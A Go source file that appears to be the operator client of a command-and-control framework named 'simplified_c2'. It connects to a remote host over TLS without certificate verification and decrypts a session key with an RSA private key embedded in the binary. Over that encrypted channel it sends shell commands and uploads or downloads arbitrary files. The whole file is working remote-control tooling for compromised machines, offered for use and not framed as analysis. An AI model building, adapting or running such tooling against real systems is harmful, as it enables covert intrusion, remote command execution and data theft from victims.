package main

import (
	"bufio"
	"crypto/tls"
	"encoding/binary"
	"encoding/gob"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/signal"
	"strings"
	"syscall"

	"github.com/simplified_c2/core/crypto"
	"github.com/simplified_c2/shell"

	_ "embed"
)

const (
	PROTOCOL_VERSION  = 1
	MSG_HANDSHAKE     = 1
	MSG_COMMAND       = 2
	MSG_RESPONSE      = 3
	MSG_FILE_UPLOAD   = 4
	MSG_FILE_DOWNLOAD = 5
	MSG_ERROR         = 255
	HANDSHAKE_OK      = 0
	HANDSHAKE_FAILED  = 1
)

type MessageHeader struct {
	Version    byte
	Type       byte
	PayloadLen uint32
}

type SecureShell struct {
	conn        net.Conn
	passphrase  []byte // Fallback passphrase (not used with session key)
	sessionID   string
	sessionKey  []byte // Session-specific AES key
	sessionIV   []byte // Session-specific AES IV
	interactive bool
	shell       *shell.Shell
}

//go:embed private_key.pem
var privateKeyPEM []byte // RSA private key for decrypting session key/IV

func NewSecureShell(passphrase string, interactive bool) *SecureShell {
	return &SecureShell{
		passphrase:  []byte(passphrase),
		interactive: interactive,
		shell:       shell.NewShell(),
	}
}

func (s *SecureShell) Connect(host string, port int, useTLS bool) error {
	var err error
	addr := fmt.Sprintf("%s:%d", host, port)
	if useTLS {
		tlsConfig := &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			},
		}
		s.conn, err = tls.Dial("tcp", addr, tlsConfig)
	} else {
		s.conn, err = net.Dial("tcp", addr)
	}
	if err != nil {
		return fmt.Errorf("connection failed: %v", err)
	}
	fmt.Printf("Connected to %s\n", addr)

	if err := s.performHandshake(); err != nil {
		s.conn.Close()
		return fmt.Errorf("handshake failed: %v", err)
	}
	fmt.Println("Secure connection established")
	return nil
}

func (s *SecureShell) performHandshake() error {
	decoder := gob.NewDecoder(s.conn)
	encoder := gob.NewEncoder(s.conn)

	// Receive session ID
	var sessionID string
	if err := decoder.Decode(&sessionID); err != nil {
		return fmt.Errorf("failed to receive session ID: %v", err)
	}
	if sessionID == "" {
		return fmt.Errorf("received empty session ID")
	}
	s.sessionID = sessionID
	fmt.Printf("Received session ID: %s\n", sessionID)

	// Receive encrypted key and IV
	var encryptedKey, encryptedIV []byte
	if err := decoder.Decode(&encryptedKey); err != nil {
		return fmt.Errorf("failed to receive encrypted key: %v", err)
	}
	if len(encryptedKey) == 0 {
		return fmt.Errorf("received empty encrypted key")
	}
	fmt.Printf("Received encrypted key: %d bytes\n", len(encryptedKey))

	if err := decoder.Decode(&encryptedIV); err != nil {
		return fmt.Errorf("failed to receive encrypted IV: %v", err)
	}
	if len(encryptedIV) == 0 {
		return fmt.Errorf("received empty encrypted IV")
	}
	fmt.Printf("Received encrypted IV: %d bytes\n", len(encryptedIV))

	// Decrypt key and IV using RSA private key
	key, err := crypto.RsaDecoding(privateKeyPEM, encryptedKey)
	if err != nil {
		return fmt.Errorf("failed to decrypt session key: %v", err)
	}
	if len(key) != 32 { // AES-256 expects a 32-byte key
		return fmt.Errorf("invalid session key length: got %d, expected 32", len(key))
	}
	fmt.Printf("Decrypted session key: %d bytes\n", len(key))

	iv, err := crypto.RsaDecoding(privateKeyPEM, encryptedIV)
	if err != nil {
		return fmt.Errorf("failed to decrypt session IV: %v", err)
	}
	if len(iv) != 16 { // AES expects a 16-byte IV
		return fmt.Errorf("invalid session IV length: got %d, expected 16", len(iv))
	}
	fmt.Printf("Decrypted session IV: %d bytes\n", len(iv))

	// Store key and IV
	s.sessionKey = key
	s.sessionIV = iv

	// Send handshake response
	response := []byte{HANDSHAKE_OK}
	if err := encoder.Encode(response); err != nil {
		return fmt.Errorf("failed to send handshake response: %v", err)
	}

	return nil
}

func (s *SecureShell) sendMessage(msgType byte, payload []byte) error {
	// Use session key for encryption
	encryptedPayload, err := crypto.AESEncrypt(payload, s.sessionKey)
	if err != nil {
		return fmt.Errorf("encryption failed: %v", err)
	}

	header := MessageHeader{
		Version:    PROTOCOL_VERSION,
		Type:       msgType,
		PayloadLen: uint32(len(encryptedPayload)),
	}

	if err := binary.Write(s.conn, binary.BigEndian, header.Version); err != nil {
		return err
	}
	if err := binary.Write(s.conn, binary.BigEndian, header.Type); err != nil {
		return err
	}
	if err := binary.Write(s.conn, binary.BigEndian, header.PayloadLen); err != nil {
		return err
	}

	_, err = s.conn.Write(encryptedPayload)
	return err
}

func (s *SecureShell) receiveMessage() (byte, []byte, error) {
	var header MessageHeader
	if err := binary.Read(s.conn, binary.BigEndian, &header.Version); err != nil {
		return 0, nil, err
	}
	if err := binary.Read(s.conn, binary.BigEndian, &header.Type); err != nil {
		return 0, nil, err
	}
	if err := binary.Read(s.conn, binary.BigEndian, &header.PayloadLen); err != nil {
		return 0, nil, err
	}
	if header.Version != PROTOCOL_VERSION {
		return 0, nil, fmt.Errorf("unsupported protocol version: %d", header.Version)
	}

	encryptedPayload := make([]byte, header.PayloadLen)
	if _, err := io.ReadFull(s.conn, encryptedPayload); err != nil {
		return 0, nil, err
	}

	// Use session key for decryption
	payload, err := crypto.AESDecrypt(encryptedPayload, s.sessionKey)
	if err != nil {
		return 0, nil, fmt.Errorf("decryption failed: %v", err)
	}
	return header.Type, payload, nil
}

func (s *SecureShell) RunInteractive() error {
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\nExiting...")
		s.conn.Close()
		os.Exit(0)
	}()
	fmt.Println("Secure shell ready. Type 'exit' to quit.")
	fmt.Println("Special commands:")
	fmt.Println("  upload <local_file> <remote_file> - Upload a file")
	fmt.Println("  download <remote_file> <local_file> - Download a file")
	fmt.Println("  cd <directory> - Change directory")
	fmt.Println("  pwd - Print working directory")

	for {
		fmt.Print("> ")
		scanner := bufio.NewScanner(os.Stdin)
		if !scanner.Scan() {
			break
		}
		command := strings.TrimSpace(scanner.Text())

		if len(command) > 7 && command[:7] == "upload " {
			var localFile, remoteFile string
			fmt.Sscanf(command[7:], "%s %s", &localFile, &remoteFile)
			if localFile == "" || remoteFile == "" {
				fmt.Println("Usage: upload <local_file> <remote_file>")
				continue
			}
			if err := s.uploadFile(localFile, remoteFile); err != nil {
				fmt.Printf("Upload failed: %v\n", err)
			} else {
				fmt.Println("Upload complete")
			}
			continue
		}
		if len(command) > 9 && command[:9] == "download " {
			var remoteFile, localFile string
			fmt.Sscanf(command[9:], "%s %s", &remoteFile, &localFile)
			if remoteFile == "" || localFile == "" {
				fmt.Println("Usage: download <remote_file> <local_file>")
				continue
			}
			if err := s.downloadFile(remoteFile, localFile); err != nil {
				fmt.Printf("Download failed: %v\n", err)
			} else {
				fmt.Println("Download complete")
			}
			continue
		}

		if err := s.sendMessage(MSG_COMMAND, []byte(command)); err != nil {
			fmt.Printf("Error sending command: %v\n", err)
			break
		}

		msgType, payload, err := s.receiveMessage()
		if err != nil {
			fmt.Printf("Error receiving response: %v\n", err)
			break
		}
		if msgType == MSG_ERROR {
			fmt.Printf("Error: %s\n", string(payload))
		} else if msgType == MSG_RESPONSE {
			fmt.Println(string(payload))
		} else {
			fmt.Printf("Unexpected message type: %d\n", msgType)
		}
	}
	return nil
}

func (s *SecureShell) uploadFile(localPath, remotePath string) error {
	data, err := os.ReadFile(localPath)
	if err != nil {
		return err
	}

	uploadMsg := append([]byte(remotePath), 0)
	uploadMsg = append(uploadMsg, data...)

	if err := s.sendMessage(MSG_FILE_UPLOAD, uploadMsg); err != nil {
		return err
	}

	msgType, payload, err := s.receiveMessage()
	if err != nil {
		return err
	}
	if msgType == MSG_ERROR {
		return fmt.Errorf("server error: %s", string(payload))
	}
	return nil
}

func (s *SecureShell) downloadFile(remotePath, localPath string) error {
	if err := s.sendMessage(MSG_FILE_DOWNLOAD, []byte(remotePath)); err != nil {
		return err
	}

	msgType, payload, err := s.receiveMessage()
	if err != nil {
		return err
	}
	if msgType == MSG_ERROR {
		return fmt.Errorf("server error: %s", string(payload))
	}
	if msgType != MSG_FILE_DOWNLOAD {
		return fmt.Errorf("unexpected message type: %d", msgType)
	}

	return os.WriteFile(localPath, payload, 0644)
}

func (s *SecureShell) ExecuteCommand(command string) (string, error) {
	if err := s.sendMessage(MSG_COMMAND, []byte(command)); err != nil {
		return "", err
	}

	msgType, payload, err := s.receiveMessage()
	if err != nil {
		return "", err
	}
	if msgType == MSG_ERROR {
		return "", fmt.Errorf("server error: %s", string(payload))
	}
	if msgType != MSG_RESPONSE {
		return "", fmt.Errorf("unexpected message type: %d", msgType)
	}
	return string(payload), nil
}

func (s *SecureShell) Close() {
	if s.conn != nil {
		s.conn.Close()
	}
}

func main() {
	host := flag.String("host", "127.0.0.1", "Host to connect to")
	port := flag.Int("port", 8443, "Port to connect to")
	passphrase := flag.String("passphrase", "default-passphrase", "Passphrase for encryption (fallback)")
	useTLS := flag.Bool("tls", true, "Use TLS encryption")
	interactive := flag.Bool("interactive", true, "Run in interactive mode")
	command := flag.String("command", "", "Single command to execute (non-interactive mode)")
	flag.Parse()

	secureShell := NewSecureShell(*passphrase, *interactive)

	err := secureShell.Connect(*host, *port, *useTLS)
	if err != nil {
		fmt.Printf("Connection failed: %v\n", err)
		os.Exit(1)
	}
	defer secureShell.Close()

	if *interactive {
		if err := secureShell.RunInteractive(); err != nil {
			fmt.Printf("Error: %v\n", err)
			os.Exit(1)
		}
	} else if *command != "" {
		output, err := secureShell.ExecuteCommand(*command)
		if err != nil {
			fmt.Printf("Error: %v\n", err)
			os.Exit(1)
		}
		fmt.Println(output)
	} else {
		fmt.Println("No command specified in non-interactive mode")
		os.Exit(1)
	}
}
